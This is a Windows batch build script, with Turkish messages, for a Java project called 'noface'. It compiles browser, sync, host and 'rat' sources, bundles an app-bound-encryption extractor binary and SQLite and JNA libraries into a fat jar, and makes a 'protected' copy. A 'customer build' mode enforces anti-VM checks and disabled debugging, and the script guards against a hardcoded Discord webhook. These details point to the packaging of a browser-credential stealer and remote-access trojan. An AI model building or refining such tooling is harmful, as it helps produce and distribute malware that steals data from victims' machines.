@echo off
setlocal EnableExtensions
cd /d "%~dp0"

if /I not "%DEBUG_OK%"=="1" (
    findstr /C:"DEBUG = true" "core\config\Cfg.java" >nul 2>&1
    if not errorlevel 1 (
        echo [!] Cfg.DEBUG=true yasak — false yap
        exit /b 1
    )
)
if /I "%CUSTOMER_BUILD%"=="1" (
    findstr /C:"DEBUG = false" "core\config\Cfg.java" >nul 2>&1
    if errorlevel 1 (
        echo [!] customer build: Cfg.DEBUG=false zorunlu
        exit /b 1
    )
    findstr /C:"ANTI_VM = true" "core\config\Cfg.java" >nul 2>&1
    if errorlevel 1 (
        echo [!] customer build: Cfg.ANTI_VM=true zorunlu
        exit /b 1
    )
)
findstr /I /C:"discord.com/api/webhooks/" "core\config\Hook.java" >nul 2>&1
if not errorlevel 1 (
    echo [!] Hook.java hardcoded discord webhook yasak
    exit /b 1
)

set "CORE=core"
set "CP=%CORE%\lib\jna-5.15.0.jar;%CORE%\lib\jna-platform-5.15.0.jar;%CORE%\lib\sqlite-jdbc-3.46.1.0.jar;%CORE%\lib\slf4j-api-2.0.17.jar;%CORE%\lib\slf4j-nop-2.0.17.jar"
set "TARGET=target"
set "FAT=%TARGET%\fat"
set "OUT=%TARGET%\noface.jar"
set "PROTECTED=%TARGET%\noface-protected.jar"

if not exist "%CORE%\lib\jna-5.15.0.jar" (
    echo [!] core\lib\ eksik
    exit /b 1
)

if not defined JAVA_HOME (
    for %%D in (
        "C:\Program Files\Java\jdk-21.0.12"
        "C:\Program Files\Java\jdk-21*"
        "C:\Program Files\Eclipse Adoptium\jdk-21.0.10.7-hotspot"
        "C:\Program Files\Microsoft\jdk-25.0.3.9-hotspot"
        "D:\graalvm-jdk-21.0.10"
        "C:\Program Files\Java\jdk-17*"
    ) do if exist "%%~D" if not defined JAVA_HOME set "JAVA_HOME=%%~D"
)
if defined JAVA_HOME set "PATH=%JAVA_HOME%\bin;%PATH%"
for %%V in (Python313 Python312 Python311 Python310 Python39) do (
    if exist "%LocalAppData%\Programs\Python\%%V\python.exe" set "PATH=%LocalAppData%\Programs\Python\%%V;%LocalAppData%\Programs\Python\%%V\Scripts;%PATH%"
)

where javac >nul 2>&1
if errorlevel 1 (
    echo [!] javac bulunamadi
    exit /b 1
)
where jar >nul 2>&1
if errorlevel 1 (
    echo [!] jar bulunamadi
    exit /b 1
)

echo [1/5] seal...
where python >nul 2>&1
if errorlevel 1 (
    echo [!] python bulunamadi
    exit /b 1
)
python "%CORE%\tools\seal.py" seal
if errorlevel 1 (
    echo [!] seal fail
    exit /b 1
)

echo [2/5] compile...
if exist bin rmdir /s /q bin
mkdir bin
mkdir bin\abe
if exist "%CORE%\resources\abe\abe_extractor_amd64.bin" (
    copy /Y "%CORE%\resources\abe\abe_extractor_amd64.bin" bin\abe\ >nul
)
dir /s /b target\gen\browsers\*.java target\gen\config\*.java target\gen\sync\*.java target\gen\api\*.java target\gen\host\*.java target\gen\rat\*.java > "%TEMP%\nf_src.txt" 2>nul
javac -encoding UTF-8 --release 17 -cp "%CP%" -d bin @"%TEMP%\nf_src.txt"
if errorlevel 1 (
    echo [!] compile fail
    exit /b 1
)
for /f "delims=" %%J in ('where javac 2^>nul') do (
    echo %%~dpJjava.exe> bin\jdk.txt
    goto :jdk_ok
)
:jdk_ok

echo [3/5] fat jar...
if not exist "%TARGET%" mkdir "%TARGET%"
if exist "%FAT%" rmdir /s /q "%FAT%"
mkdir "%FAT%"
xcopy /E /I /Y /Q bin\* "%FAT%\" >nul
for %%J in (%CORE%\lib\*.jar) do (
    pushd "%FAT%"
    jar xf "..\..\%CORE%\lib\%%~nxJ" >nul 2>&1
    popd
)
for %%D in (Linux Mac FreeBSD Android) do if exist "%FAT%\org\sqlite\native\%%D" rmdir /s /q "%FAT%\org\sqlite\native\%%D"
for %%D in (x86 armv7 aarch64 arm) do if exist "%FAT%\org\sqlite\native\Windows\%%D" rmdir /s /q "%FAT%\org\sqlite\native\Windows\%%D"
for %%D in (linux-x86-64 linux-x86 linux-aarch64 linux-arm linux-armel linux-mips64el linux-ppc64le linux-riscv64 linux-s390x darwin-x86-64 darwin-aarch64 sunos-x86-64 sunos-sparc freebsd-x86-64 freebsd-x86 openbsd-x86-64 aix-ppc64 win32-x86 win32-aarch64) do (
    if exist "%FAT%\com\sun\jna\%%D" rmdir /s /q "%FAT%\com\sun\jna\%%D"
)
if exist "%FAT%\org\objectweb" rmdir /s /q "%FAT%\org\objectweb"
if exist "%FAT%\com\sun\jna\platform\win32\Crypt32.class" del /f /q "%FAT%\com\sun\jna\platform\win32\Crypt32.class"
if exist "%FAT%\com\sun\jna\platform\win32\Crypt32Util.class" del /f /q "%FAT%\com\sun\jna\platform\win32\Crypt32Util.class"
if exist "%FAT%\jdk.txt" del /f /q "%FAT%\jdk.txt"
(echo Main-Class: noface.browsers.Boot) > "%TARGET%\MANIFEST.MF"
if exist "%OUT%" del /f /q "%OUT%"
jar cfm "%OUT%" "%TARGET%\MANIFEST.MF" -C "%FAT%" .
if errorlevel 1 (
    echo [!] jar fail
    exit /b 1
)
rmdir /s /q "%FAT%"
copy /Y "%OUT%" "%PROTECTED%" >nul
if errorlevel 1 (
    echo [!] protected copy fail
    exit /b 1
)

echo [4/5] done!

for %%I in ("%OUT%") do echo [+] %OUT% size=%%~zI
echo [+] %PROTECTED%
exit /b 0
